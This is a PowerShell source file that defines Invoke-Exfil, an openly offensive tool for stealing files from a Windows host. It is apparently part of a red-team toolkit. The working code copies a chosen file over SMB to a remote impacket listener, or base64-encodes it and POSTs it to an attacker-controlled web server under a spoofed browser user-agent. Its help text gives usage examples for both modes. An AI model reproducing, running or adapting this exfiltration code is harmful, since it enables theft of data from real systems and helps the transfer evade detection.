function Invoke-Exfil {
[CmdletBinding()]
param (
	[Switch]$Help,
	[Switch]$SmbExfil,
	[String]$SmbIp,
	[String]$LocalFile,
	[Switch]$RestMethod,
	[String]$LocalFile2=[String]$Localfile,
	[String]$Url
)

	if ($Help -eq $True) {
		Write @"
		
 ### Invoke-Exfil Help ###
 -------------------------
 Available Invoke-Exfil Commands:
 --------------------------------
 /-------------------------------------------------------------------------------/
 | -SmbExfil [-SmbIp] smb_ip [-LocalFile] local_file                             |
 | ----------------------------------------------------------------------------- |
                                                                                
   [*] Description: Copies a local file over SMB to a remote SMB                
       Listener.                                                                
                                                                                
   [*] Usage: Invoke-Exfil -SmbExfil -SmbIp n.n.n.n -LocalFile C:\temp\data.txt 
   [*] Use impacket on remote:                                                  
       impacket-smbserver data /tmp/data -smb2support                           
 
 /-------------------------------------------------------------------------------/
 | -RestMethod [-LocalFile] local_file [-Url] remote_server                      |
 | ----------------------------------------------------------------------------- |
 
   [*] Description: Uses PowerShell's "Invoke-RestMethod" "POST" to encode and 
       send a file to an attacker-controlled web server.
	
   [*] Usage: Invoke-Exfil -RestMethod -File C:\file -Url https://192.168.1.1/exfil
   

"@
	}
	elseif ($SmbExfil -and $SmbIp -and $LocalFile) {
		(Copy-Item -Path $LocalFile -Destination \\$SmbIp\data\)
	}
	elseif ($RestMethod -and $LocalFile -and $Url) {
	
		if ($PSVersionTable.PSVersion.Major -eq "2") {
			Write " [!] This function requires PowerShell version greater than 2.0."
			return
		}
		else {
			$Data = Get-Content $LocalFile
			$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Data)
			$EncodedData = [Convert]::ToBase64String($Bytes)
			
			$Headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
			$Headers.Add("USER-AGENT", 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko')
			
			$Request = Invoke-RestMethod $Url -Method Post -Body $EncodedData -Headers $Headers
		}
	}	
}